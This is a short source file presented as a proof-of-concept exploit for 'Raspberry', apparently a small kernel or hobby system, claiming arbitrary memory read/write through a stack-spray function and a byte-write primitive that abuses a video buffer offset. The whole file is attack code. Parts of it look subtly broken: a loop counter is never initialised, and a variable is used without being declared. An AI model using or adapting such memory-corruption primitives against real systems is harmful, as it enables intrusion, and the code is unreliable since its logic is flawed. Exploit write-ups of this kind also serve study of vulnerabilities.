// Raspberry
// This is a PoC that exploits Raspberry, to allow arbitrary memory r/w.
// It allows you to spray the stack with bytes, or write to arbitrary locations in memory using w_byte. 
// Writeup in WRITEUP.md.

void spray(char byte) {
	char buffer[0x20000];
	
	for (int j; j < 0x20000; j++) {
		buffer[j] = byte;
	};
	
	printc(buffer, byte);
	
	return;
};

void w_byte(int loc, char byte) {
	char buffer[1];
	
	buffer[0] = byte;
	location = loc + 0xfa0;
	
	printc(buffer, video[loc + 0xfa0 + 1]);
	clear_screen();
	
	return;
};

int kernel_test() {
	w_byte(0x5, 'A');
	
	clear_screen();
	
	if (video[0xfa5] == 'A') {
		return 1;
	};
	
	return 0;
};
